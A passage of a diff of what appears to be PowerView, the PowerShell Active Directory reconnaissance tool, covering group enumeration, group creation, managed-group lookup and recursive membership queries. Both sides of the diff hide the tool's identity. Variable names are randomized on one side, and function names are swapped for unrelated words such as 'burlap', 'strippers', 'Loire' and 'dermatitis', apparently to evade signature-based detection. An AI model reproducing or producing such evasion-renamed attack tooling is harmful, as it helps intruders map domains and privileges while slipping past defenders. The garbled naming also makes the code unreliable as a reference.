+                    Write-Verbose "[typing] Searching for group scope '$GroupScopeValue'"
                 }
                 if ($PSBoundParameters['GroupProperty']) {
-                    $aDrSmUHb99 = $PSBoundParameters['GroupProperty']
-                    $kXbEpVCq99 = Switch ($aDrSmUHb99) {
+                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
+                    $Filter = Switch ($GroupPropertyValue) {
                         'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                         'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                         'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                         'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                     }
-                    Write-Verbose "[burlap] Searching for group property '$aDrSmUHb99'"
+                    Write-Verbose "[typing] Searching for group property '$GroupPropertyValue'"
                 }
                 if ($PSBoundParameters['LDAPFilter']) {
-                    Write-Verbose "[burlap] Using additional LDAP filter: $HOOTOEqu99"
-                    $kXbEpVCq99 += "$HOOTOEqu99"
+                    Write-Verbose "[typing] Using additional LDAP filter: $LDAPFilter"
+                    $Filter += "$LDAPFilter"
                 }
-                $vLzWmKPH99.filter = "(&(objectCategory=group)$kXbEpVCq99)"
-                Write-Verbose "[burlap] filter string: $($vLzWmKPH99.filter)"
-                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $vLzWmKPH99.FindOne() }
-                else { $pfqXXMQd99 = $vLzWmKPH99.FindAll() }
-                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
+                Write-Verbose "[typing] filter string: $($GroupSearcher.filter)"
+                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
+                else { $Results = $GroupSearcher.FindAll() }
+                $Results | Where-Object {$_} | ForEach-Object {
                     if ($PSBoundParameters['Raw']) {
                         $Group = $_
                     }
                     else {
-                        $Group = Buddy -Properties $_.Properties
+                        $Group = bookie -Properties $_.Properties
                     }
                     $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                     $Group
                 }
-                if ($pfqXXMQd99) {
-                    try { $pfqXXMQd99.dispose() }
+                if ($Results) {
+                    try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[burlap] Error disposing of the Results object"
+                        Write-Verbose "[typing] Error disposing of the Results object"
                     }
                 }
-                $vLzWmKPH99.dispose()
+                $GroupSearcher.dispose()
             }
         }
     }
 }
-function incorruptible {
+function Loire {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
@@ -5036,59 +5036,59 @@ function incorruptible {
         [Parameter(Mandatory = $True)]
         [ValidateLength(0, 256)]
         [String]
-        $xjbZUAHW99,
+        $SamAccountName,
         [ValidateNotNullOrEmpty()]
         [String]
         $Name,
         [ValidateNotNullOrEmpty()]
         [String]
-        $LyNjMZjk99,
+        $DisplayName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $zdmbPkzH99,
+        $Description,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
-    $cqurrley99 = @{
-        'Identity' = $xjbZUAHW99
+    $ContextArguments = @{
+        'Identity' = $SamAccountName
     }
-    if ($PSBoundParameters['Domain']) { $cqurrley99['Domain'] = $SSNUOPgW99 }
-    if ($PSBoundParameters['Credential']) { $cqurrley99['Credential'] = $gxazvivN99 }
-    $JBFcwhcg99 = Piedmont @ContextArguments
-    if ($JBFcwhcg99) {
-        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($JBFcwhcg99.Context)
-        $Group.SamAccountName = $JBFcwhcg99.Identity
+    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+    $Context = demarcates @ContextArguments
+    if ($Context) {
+        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($Context.Context)
+        $Group.SamAccountName = $Context.Identity
         if ($PSBoundParameters['Name']) {
             $Group.Name = $Name
         }
         else {
-            $Group.Name = $JBFcwhcg99.Identity
+            $Group.Name = $Context.Identity
         }
         if ($PSBoundParameters['DisplayName']) {
-            $Group.DisplayName = $LyNjMZjk99
+            $Group.DisplayName = $DisplayName
         }
         else {
-            $Group.DisplayName = $JBFcwhcg99.Identity
+            $Group.DisplayName = $Context.Identity
         }
         if ($PSBoundParameters['Description']) {
-            $Group.Description = $zdmbPkzH99
+            $Group.Description = $Description
         }
-        Write-Verbose "[incorruptible] Attempting to create group '$xjbZUAHW99'"
+        Write-Verbose "[Loire] Attempting to create group '$SamAccountName'"
         try {
             $Null = $Group.Save()
-            Write-Verbose "[incorruptible] Group '$xjbZUAHW99' successfully created"
+            Write-Verbose "[Loire] Group '$SamAccountName' successfully created"
             $Group
         }
         catch {
-            Write-Warning "[incorruptible] Error creating group '$xjbZUAHW99' : $_"
+            Write-Warning "[Loire] Error creating group '$SamAccountName' : $_"
         }
     }
 }
-function flick {
+function proceeding {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ManagedSecurityGroup')]
     [CmdletBinding()]
@@ -5097,85 +5097,85 @@ function flick {
         [Alias('Name')]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
             'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
         }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
     }
     PROCESS {
         if ($PSBoundParameters['Domain']) {
-            $PPosolen99['Domain'] = $SSNUOPgW99
-            $IayDthuO99 = $SSNUOPgW99
+            $SearcherArguments['Domain'] = $Domain
+            $TargetDomain = $Domain
         }
         else {
-            $IayDthuO99 = $Env:USERDNSDOMAIN
+            $TargetDomain = $Env:USERDNSDOMAIN
         }
-        burlap @SearcherArguments | ForEach-Object {
-            $PPosolen99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
-            $PPosolen99['Identity'] = $_.managedBy
-            $Null = $PPosolen99.Remove('LDAPFilter')
-            $pNmdNGtD99 = farrowing @SearcherArguments
-            $rMVNeNaH99 = New-Object PSObject
-            $rMVNeNaH99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
-            $rMVNeNaH99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
-            $rMVNeNaH99 | Add-Member Noteproperty 'ManagerName' $pNmdNGtD99.samaccountname
-            $rMVNeNaH99 | Add-Member Noteproperty 'ManagerDistinguishedName' $pNmdNGtD99.distinguishedName
-            if ($pNmdNGtD99.samaccounttype -eq 0x10000000) {
-                $rMVNeNaH99 | Add-Member Noteproperty 'ManagerType' 'Group'
+        typing @SearcherArguments | ForEach-Object {
+            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
+            $SearcherArguments['Identity'] = $_.managedBy
+            $Null = $SearcherArguments.Remove('LDAPFilter')
+            $GroupManager = dermatitis @SearcherArguments
+            $ManagedGroup = New-Object PSObject
+            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
+            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
+            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
+            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName
+            if ($GroupManager.samaccounttype -eq 0x10000000) {
+                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
             }
-            elseif ($pNmdNGtD99.samaccounttype -eq 0x30000000) {
-                $rMVNeNaH99 | Add-Member Noteproperty 'ManagerType' 'User'
+            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
+                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
             }
-            $WGnEEzJx99 = @{
+            $ACLArguments = @{
                 'Identity' = $_.distinguishedname
                 'RightsFilter' = 'WriteMembers'
             }
-            if ($PSBoundParameters['Server']) { $WGnEEzJx99['Server'] = $mSxqoOjK99 }
-            if ($PSBoundParameters['SearchScope']) { $WGnEEzJx99['SearchScope'] = $vaSWXjPs99 }
-            if ($PSBoundParameters['ResultPageSize']) { $WGnEEzJx99['ResultPageSize'] = $mhcqrrQn99 }
-            if ($PSBoundParameters['ServerTimeLimit']) { $WGnEEzJx99['ServerTimeLimit'] = $mvTbAWDU99 }
-            if ($PSBoundParameters['Tombstone']) { $WGnEEzJx99['Tombstone'] = $rPozaKft99 }
-            if ($PSBoundParameters['Credential']) { $WGnEEzJx99['Credential'] = $gxazvivN99 }
-            $rMVNeNaH99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
-            $rMVNeNaH99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
-            $rMVNeNaH99
+            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }
+            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
+            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
+            $ManagedGroup
         }
     }
 }
-function strippers {
+function Aesculapius {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [OutputType('PowerView.GroupMember')]
@@ -5184,288 +5184,288 @@ function strippers {
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Parameter(ParameterSetName = 'ManualRecurse')]
         [Switch]
-        $rgwwJWhX99,
+        $Recurse,
         [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
         [Switch]
-        $PZlvJJwL99,
+        $RecurseUsingMatchingRule,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'Properties' = 'member,samaccountname,distinguishedname'
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['LDAPFilter']) { $PPosolen99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $GnxtbMaP99 = @{}
-        if ($PSBoundParameters['Domain']) { $GnxtbMaP99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $GnxtbMaP99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Credential']) { $GnxtbMaP99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $ADNameArguments = @{}
+        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
     }
     PROCESS {
-        $vLzWmKPH99 = watersides @SearcherArguments
-        if ($vLzWmKPH99) {
+        $GroupSearcher = deadly @SearcherArguments
+        if ($GroupSearcher) {
             if ($PSBoundParameters['RecurseUsingMatchingRule']) {
-                $PPosolen99['Identity'] = $BfpbWwpi99
-                $PPosolen99['Raw'] = $True
-                $Group = burlap @SearcherArguments
+                $SearcherArguments['Identity'] = $Identity
+                $SearcherArguments['Raw'] = $True
+                $Group = typing @SearcherArguments
                 if (-not $Group) {
-                    Write-Warning "[strippers] Error searching for group with identity: $BfpbWwpi99"
+                    Write-Warning "[Aesculapius] Error searching for group with identity: $Identity"
                 }
                 else {
-                    $PqNFtuNd99 = $Group.properties.item('samaccountname')[0]
-                    $QauRgHVJ99 = $Group.properties.item('distinguishedname')[0]
+                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
+                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]
                     if ($PSBoundParameters['Domain']) {
-                        $xGMUYkFb99 = $SSNUOPgW99
+                        $GroupFoundDomain = $Domain
                     }
                     else {
-                        if ($QauRgHVJ99) {
-                            $xGMUYkFb99 = $QauRgHVJ99.SubString($QauRgHVJ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        if ($GroupFoundDN) {
+                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
-                    Write-Verbose "[strippers] Using LDAP matching rule to recurse on '$QauRgHVJ99', only user accounts will be returned."
-                    $vLzWmKPH99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$QauRgHVJ99))"
-                    $vLzWmKPH99.PropertiesToLoad.AddRange(('distinguishedName'))
-                    $SvCMbRzc99 = $vLzWmKPH99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
+                    Write-Verbose "[Aesculapius] Using LDAP matching rule to recurse on '$GroupFoundDN', only user accounts will be returned."
+                    $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
+                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
+                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                 }
-                $Null = $PPosolen99.Remove('Raw')
+                $Null = $SearcherArguments.Remove('Raw')
             }
             else {
-                $afFJXkRc99 = ''
-                $kXbEpVCq99 = ''
-                $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                    $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                    if ($QghnbJOP99 -match '^S-1-') {
-                        $afFJXkRc99 += "(objectsid=$QghnbJOP99)"
+                $IdentityFilter = ''
+                $Filter = ''
+                $Identity | Where-Object {$_} | ForEach-Object {
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match '^S-1-') {
+                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                     }
-                    elseif ($QghnbJOP99 -match '^CN=') {
-                        $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+                    elseif ($IdentityInstance -match '^CN=') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                         if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                            $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            Write-Verbose "[strippers] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                            $PPosolen99['Domain'] = $BvhyhWZG99
-                            $vLzWmKPH99 = watersides @SearcherArguments
-                            if (-not $vLzWmKPH99) {
-                                Write-Warning "[strippers] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            Write-Verbose "[Aesculapius] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            $SearcherArguments['Domain'] = $IdentityDomain
+                            $GroupSearcher = deadly @SearcherArguments
+                            if (-not $GroupSearcher) {
+                                Write-Warning "[Aesculapius] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
-                    elseif ($QghnbJOP99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
-                        $DwsqqDxI99 = (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
-                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
-                    elseif ($QghnbJOP99.Contains('\')) {
-                        $TzefbTEv99 = $QghnbJOP99.Replace('\28', '(').Replace('\29', ')') | kinsman -OutputType Canonical
-                        if ($TzefbTEv99) {
-                            $BBaSdAsr99 = $TzefbTEv99.SubString(0, $TzefbTEv99.IndexOf('/'))
-                            $SZjbzmKX99 = $QghnbJOP99.Split('\')[1]
-                            $afFJXkRc99 += "(samAccountName=$SZjbzmKX99)"
-                            $PPosolen99['Domain'] = $BBaSdAsr99
-                            Write-Verbose "[strippers] Extracted domain '$BBaSdAsr99' from '$QghnbJOP99'"
-                            $vLzWmKPH99 = watersides @SearcherArguments
+                    elseif ($IdentityInstance.Contains('\')) {
+                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | corralling -OutputType Canonical
+                        if ($ConvertedIdentityInstance) {
+                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                            $GroupName = $IdentityInstance.Split('\')[1]
+                            $IdentityFilter += "(samAccountName=$GroupName)"
+                            $SearcherArguments['Domain'] = $GroupDomain
+                            Write-Verbose "[Aesculapius] Extracted domain '$GroupDomain' from '$IdentityInstance'"
+                            $GroupSearcher = deadly @SearcherArguments
                         }
                     }
                     else {
-                        $afFJXkRc99 += "(samAccountName=$QghnbJOP99)"
+                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                     }
                 }
-                if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                    $kXbEpVCq99 += "(|$afFJXkRc99)"
+                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                    $Filter += "(|$IdentityFilter)"
                 }
                 if ($PSBoundParameters['LDAPFilter']) {
-                    Write-Verbose "[strippers] Using additional LDAP filter: $HOOTOEqu99"
-                    $kXbEpVCq99 += "$HOOTOEqu99"
+                    Write-Verbose "[Aesculapius] Using additional LDAP filter: $LDAPFilter"
+                    $Filter += "$LDAPFilter"
                 }
-                $vLzWmKPH99.filter = "(&(objectCategory=group)$kXbEpVCq99)"
-                Write-Verbose "[strippers] strippers filter string: $($vLzWmKPH99.filter)"
+                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
+                Write-Verbose "[Aesculapius] Aesculapius filter string: $($GroupSearcher.filter)"
                 try {
-                    $fYOedlSN99 = $vLzWmKPH99.FindOne()
+                    $Result = $GroupSearcher.FindOne()
                 }
                 catch {
-                    Write-Warning "[strippers] Error searching for group with identity '$BfpbWwpi99': $_"
-                    $SvCMbRzc99 = @()
+                    Write-Warning "[Aesculapius] Error searching for group with identity '$Identity': $_"
+                    $Members = @()
                 }
-                $PqNFtuNd99 = ''
-                $QauRgHVJ99 = ''
-                if ($fYOedlSN99) {
-                    $SvCMbRzc99 = $fYOedlSN99.properties.item('member')
-                    if ($SvCMbRzc99.count -eq 0) {
-                        $PZoQITAp99 = $False
-                        $RGjCxdNt99 = 0
+                $GroupFoundName = ''
+                $GroupFoundDN = ''
+                if ($Result) {
+                    $Members = $Result.properties.item('member')
+                    if ($Members.count -eq 0) {
+                        $Finished = $False
+                        $Bottom = 0
                         $Top = 0
-                        while (-not $PZoQITAp99) {
-                            $Top = $RGjCxdNt99 + 1499
-                            $SxXLgDDL99="member;range=$RGjCxdNt99-$Top"
-                            $RGjCxdNt99 += 1500
-                            $Null = $vLzWmKPH99.PropertiesToLoad.Clear()
-                            $Null = $vLzWmKPH99.PropertiesToLoad.Add("$SxXLgDDL99")
-                            $Null = $vLzWmKPH99.PropertiesToLoad.Add('samaccountname')
-                            $Null = $vLzWmKPH99.PropertiesToLoad.Add('distinguishedname')
+                        while (-not $Finished) {
+                            $Top = $Bottom + 1499
+                            $MemberRange="member;range=$Bottom-$Top"
+                            $Bottom += 1500
+                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
+                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
+                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
+                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')
                             try {
-                                $fYOedlSN99 = $vLzWmKPH99.FindOne()
-                                $EWpIwsOz99 = $fYOedlSN99.Properties.PropertyNames -like "member;range=*"
-                                $SvCMbRzc99 += $fYOedlSN99.Properties.item($EWpIwsOz99)
-                                $PqNFtuNd99 = $fYOedlSN99.properties.item('samaccountname')[0]
-                                $QauRgHVJ99 = $fYOedlSN99.properties.item('distinguishedname')[0]
-                                if ($SvCMbRzc99.count -eq 0) {
-                                    $PZoQITAp99 = $True
+                                $Result = $GroupSearcher.FindOne()
+                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
+                                $Members += $Result.Properties.item($RangedProperty)
+                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
+                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
+                                if ($Members.count -eq 0) {
+                                    $Finished = $True
                                 }
                             }
                             catch [System.Management.Automation.MethodInvocationException] {
-                                $PZoQITAp99 = $True
+                                $Finished = $True
                             }
                         }
                     }
                     else {
-                        $PqNFtuNd99 = $fYOedlSN99.properties.item('samaccountname')[0]
-                        $QauRgHVJ99 = $fYOedlSN99.properties.item('distinguishedname')[0]
-                        $SvCMbRzc99 += $fYOedlSN99.Properties.item($EWpIwsOz99)
+                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
+                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
+                        $Members += $Result.Properties.item($RangedProperty)
                     }
                     if ($PSBoundParameters['Domain']) {
-                        $xGMUYkFb99 = $SSNUOPgW99
+                        $GroupFoundDomain = $Domain
                     }
                     else {
-                        if ($QauRgHVJ99) {
-                            $xGMUYkFb99 = $QauRgHVJ99.SubString($QauRgHVJ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        if ($GroupFoundDN) {
+                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                         }
                     }
                 }
             }
-            ForEach ($cgTuSBdj99 in $SvCMbRzc99) {
-                if ($rgwwJWhX99 -and $mOHAixgN99) {
-                    $SdzJuWMG99 = $_.Properties
+            ForEach ($Member in $Members) {
+                if ($Recurse -and $UseMatchingRule) {
+                    $Properties = $_.Properties
                 }
                 else {
-                    $VmkJyBhe99 = $PPosolen99.Clone()
-                    $VmkJyBhe99['Identity'] = $cgTuSBdj99
-                    $VmkJyBhe99['Raw'] = $True
-                    $VmkJyBhe99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
-                    $Object = farrowing @ObjectSearcherArguments
-                    $SdzJuWMG99 = $Object.Properties
+                    $ObjectSearcherArguments = $SearcherArguments.Clone()
+                    $ObjectSearcherArguments['Identity'] = $Member
+                    $ObjectSearcherArguments['Raw'] = $True
+                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
+                    $Object = dermatitis @ObjectSearcherArguments
+                    $Properties = $Object.Properties
                 }
-                if ($SdzJuWMG99) {
-                    $lzrMeMHC99 = New-Object PSObject
-                    $lzrMeMHC99 | Add-Member Noteproperty 'GroupDomain' $xGMUYkFb99
-                    $lzrMeMHC99 | Add-Member Noteproperty 'GroupName' $PqNFtuNd99
-                    $lzrMeMHC99 | Add-Member Noteproperty 'GroupDistinguishedName' $QauRgHVJ99
-                    if ($SdzJuWMG99.objectsid) {
-                        $TBSJNJUH99 = ((New-Object System.Security.Principal.SecurityIdentifier $SdzJuWMG99.objectsid[0], 0).Value)
+                if ($Properties) {
+                    $GroupMember = New-Object PSObject
+                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
+                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
